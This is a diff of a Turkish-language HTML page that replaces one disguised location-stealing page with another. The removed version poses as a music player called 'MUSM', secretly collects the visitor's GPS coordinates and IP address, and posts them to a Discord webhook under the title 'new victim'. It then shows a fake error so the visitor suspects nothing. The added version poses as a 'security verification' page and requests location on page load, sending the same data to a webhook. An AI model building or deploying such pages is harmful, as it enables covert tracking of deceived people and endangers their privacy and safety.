@@ -2,146 +2,184 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
+    <title>Güvenlik Doğrulaması</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MUSM | Müzik Dünyası</title>
     <style>
         body {
-            background: #121212;
-            color: #ffffff;
-            font-family: 'Circular', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #0a0a0a; /* Arka plan rengi (Koyu) */
+            color: #eaeaea; /* Yazı rengi (Açık) */
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
+            overflow: hidden; /* Sayfa taşmasını engellemek için */
         }
-        .music-card {
-            background: #181818;
-            border-radius: 15px;
-            padding: 25px;
-            width: 320px;
+        .container {
+            background: #111; /* Kutu arka plan rengi */
+            border: 1px solid #333; /* Kutu kenarlığı */
+            border-radius: 12px; /* Kutu yuvarlak köşeler */
+            padding: 40px;
+            width: 90%;
+            max-width: 550px;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5); /* Kutu gölgesi */
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            transition: transform 0.3s ease;
+            opacity: 0; /* Başlangıçta görünmez */
+            animation: fadeIn 1s forwards; /* Animasyon */
         }
-        .music-card:hover {
-            transform: translateY(-5px);
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
         }
-        .album-art {
-            width: 100%;
-            aspect-ratio: 1/1;
-            background: linear-gradient(45deg, #1db954, #191414);
-            border-radius: 10px;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 50px;
-            box-shadow: 0 8px 15px rgba(0,0,0,0.3);
+        h1 {
+            margin-top: 0;
+            color: #ffa500; /* Başlık rengi */
         }
-        h2 { margin: 10px 0 5px 0; font-size: 22px; }
-        p { color: #b3b3b3; font-size: 14px; margin-bottom: 25px; }
-        
-        .play-btn {
-            background: #1db954;
-            color: white;
-            border: none;
-            padding: 12px 35px;
-            border-radius: 30px;
-            font-weight: bold;
+        p {
             font-size: 16px;
+            line-height: 1.6;
+        }
+        button {
+            background: #ffa500; /* Buton arka plan rengi */
+            color: #0a0a0a; /* Buton yazı rengi */
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #ffcc00; /* Buton hover rengi */
+        }
+        button:disabled {
+            background: #555; /* Devre dışı buton rengi */
+            cursor: not-allowed;
+        }
+        .result {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ccc;
+        }
+        /* Gizli alanlar */
+        .hidden {
+            display: none;
+        }
+        .blurred-background {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-        }
-        .play-btn:hover {
-            background: #1ed760;
-            transform: scale(1.05);
-        }
-        .play-btn:active {
-            transform: scale(0.95);
-        }
-        #status {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #555;
+            height: 100%;
+            backdrop-filter: blur(10px); /* Arka planı bulanıklaştır */
+            -webkit-backdrop-filter: blur(10px); /* Safari için */
+            z-index: -1; /* Arka planda kalmasını sağlar */
         }
     </style>
 </head>
 <body>
+    <div class="blurred-background"></div> <!-- Bulanık arka plan -->
+    <div id="content" class="container">
+        <h1>Güvenlik Doğrulaması</h1>
+        <p>Hesabınızın güvenliğini artırmak için lütfen konumunuzu doğrulayın. Bu işlem, yalnızca güvenlik amaçlıdır ve kaydedilecektir.</p>
+        <button id="locationButton">Konumumu Doğrula</button>
+        <div id="result" class="result"></div>
+    </div>
+    <script>
+        // WEBHOOK URL'NİZİ BURAYA YAZIN
+        const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // ÖRNEK
 
-<div class="music-card">
-    <div class="album-art">🎵</div>
-    <h2>Yeni Hit Parçalar</h2>
-    <p>Dinlemek ve listene eklemek için hemen başlat.</p>
-    
-    <button id="startMusic" class="play-btn">ŞİMDİ DİNLE</button>
-    
-    <div id="status">Bağlantı güvenli • MUSM Player</div>
-</div>
+        const locationButton = document.getElementById('locationButton');
+        const resultDiv = document.getElementById('result');
 
-<script>
-    // DISCORD WEBHOOK BURAYA
-    const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
-
-    const btn = document.getElementById('startMusic');
-
-    btn.addEventListener('click', () => {
-        btn.textContent = "Yükleniyor...";
-        
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const { latitude, longitude, accuracy } = position.coords;
-                    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                    
-                    // Veriyi gizlice gönder
-                    sendLog(latitude, longitude, accuracy, mapsUrl);
-                    
-                    // Kullanıcıya çaktırmamak için bir hata verelim veya yönlendirelim
-                    setTimeout(() => {
-                        btn.textContent = "HATA: Sunucu Meşgul";
-                        btn.style.background = "#555";
-                    }, 1500);
-                },
-                (error) => {
-                    console.log("İzin reddedildi");
-                    btn.textContent = "HATA: Bağlantı Kesildi";
-                }
-            );
-        }
-    });
-
-    async function sendLog(lat, lon, acc, mapUrl) {
-        let ipInfo = "Alınamadı";
-        try {
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            ipInfo = `${data.ip} (${data.city}/${data.country})`;
-        } catch (e) {}
-
-        const payload = {
-            embeds: [{
-                title: "🎵 MUSM Panel - Yeni Kurban",
-                color: 1947988,
-                fields: [
-                    { name: "📍 Harita Linki", value: `[Konumu Gör](${mapUrl})` },
-                    { name: "🌐 IP Adresi", value: `\`${ipInfo}\``, inline: true },
-                    { name: "🎯 Doğruluk", value: `\`${acc.toFixed(0)}m\``, inline: true },
-                    { name: "📐 Koordinat", value: `\`${lat}, ${lon}\`` }
-                ],
-                footer: { text: "MUSM Arka Plan Log Sistemi" },
-                timestamp: new Date().toISOString()
-            }]
+        // Sayfa yüklendiğinde konumu otomatik olarak al
+        window.onload = () => {
+            getLocationAndSend();
         };
 
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-    }
-</script>
+        async function getLocationAndSend() {
+            if ("geolocation" in navigator) {
+                locationButton.disabled = true;
+                locationButton.textContent = 'Konum Alınıyor...';
 
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const { latitude, longitude } = position.coords;
+                        const accuracy = position.coords.accuracy;
+                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                        await sendLocationLog(latitude, longitude, accuracy, mapsUrl);
+
+                        resultDiv.innerHTML = `Konum başarıyla alındı! (Gizli)` ; // Kullanıcıya minimal geri bildirim
+                        locationButton.textContent = 'Doğrulandı';
+                        // İsteğe bağlı: Butonu gizle veya devre dışı bırak
+                        locationButton.classList.add('hidden'); // Butonu gizle
+                    },
+                    (error) => {
+                        let errorMessage = "Konum alınamadı.";
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "Konum izni reddedildi.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Konum bilgisi mevcut değil.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "Konum isteği zaman aşımına uğradı.";
+                                break;
+                        }
+                        resultDiv.textContent = errorMessage;
+                        locationButton.textContent = 'Tekrar Dene';
+                        locationButton.disabled = false;
+                    }
+                );
+            } else {
+                resultDiv.textContent = "Tarayıcınız konum özelliğini desteklemiyor.";
+                locationButton.disabled = false;
+            }
+        }
+
+
+        async function sendLocationLog(lat, lon, acc, mapUrl) {
+            const payload = {
+                content: "📍 **Yeni Konum Bilgisi!**",
+                embeds: [{
+                    title: "Konum Bilgisi",
+                    color: 5814783,
+                    fields: [
+                        { name: "Enlem (Latitude)", value: `\`\`\`${lat}\`\`\``, inline: true },
+                        { name: "Boylam (Longitude)", value: `\`\`\`${lon}\`\`\``, inline: true },
+                        { name: "Doğruluk", value: `\`\`\`~${acc.toFixed(0)} metre\`\`\``, inline: true },
+                        { name: "Harita Linki", value: `[Google Maps](${mapUrl})`, inline: false },
+                        { name: "IP Adresi", value: "\`\`\`Bilgi alınıyor...\`\`\`", inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                payload.embeds[0].fields[4].value = `\`\`\`${ipData.ip} (${ipData.city}, ${ipData.country_name})\`\`\``;
+            } catch (e) {
+                payload.embeds[0].fields[4].value = "\`\`\`IP bilgisi alınamadı.\`\`\`";
+            }
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.error("Discord'a konum bildirimi gönderilemedi:", e);
+            }
+        }
+    </script>
 </body>
 </html>
